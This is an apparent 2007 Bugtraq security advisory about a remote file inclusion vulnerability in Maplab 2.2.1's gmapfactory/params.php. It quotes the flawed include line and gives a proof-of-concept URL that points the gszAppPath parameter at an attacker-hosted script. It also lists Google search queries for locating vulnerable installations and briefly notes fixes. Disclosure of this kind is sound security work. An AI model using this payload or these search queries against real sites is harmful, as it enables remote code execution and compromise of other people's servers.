
Date: 2 Apr 2007 07:32:02 -0000
From: mufti.rizal@...il.com
To: bugtraq@...urityfocus.com
Subject: Maplab <= 2.2.1 (gszAppPath) Remote File Inclusion Vulnerability

-----------------------------------------------------------------------------------------
Maplab <= 2.2.1 (gszAppPath) Remote File Inclusion Vulnerability
-----------------------------------------------------------------------------------------

Author         : Mufti Rizal a.k.a mbahngarso
Date           : March, 30th 2007
Location       : Jakarta, Indonesia
Web            : http://acak2an.blogspot.com
Critical Lvl   : Dangerous
Impact	       : System access
Where	       : From Remote
---------------------------------------------------------------------------

Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Application   : Maplab
version       : 2.2.1
Vendor        : http://maptools.org
Description :

A suite of web-based tools that simplifies the creation and management of MapServer maps and Web mapping applications

---------------------------------------------------------------------------

Vulnerability:
~~~~~~~~~~~~~
- Invalid include function at gmapfactory/params.php  :  
  	

/* =========================gmapfactory/params.php==========================
 * Re-build the phtml file
 * ========================================================================= */
include_once($gszAppPath."htdocs/gmapfactory/build_phtml.php");

...
----------------------------------------------------------------

Input passed to the "gszAppPath" parameter in params.php is not
properly verified before being used. This can be exploited to execute
arbitrary PHP code by including files from local or external
resources.




Poc/Exploit:
~~~~~~~~~
http://www.target.com/[maplab_path]/maplab/htdocs/gmapfactory/params.php?gszAppPath=http://attacker.com/setan?



google d0rk:
~~~~~~~
"allinurl:/gmapfactory" or "allinurl:/maplab"



Solution:
~~~~~~

- Edit the source code to ensure that input is properly verified.
- Turn off register_globals


---------------------------------------------------------------------------

Shoutz:
~~~~
~ K-159, the_day, etc
~ Underground Community.

---------------------------------------------------------------------------
Contact:
~~~~~
     mbahngarso ||  mufti.rizal@...il.com
     Homepage : http://acak2an.blogspot.com
-------------------------------- [ EOF ] ----------------------------------
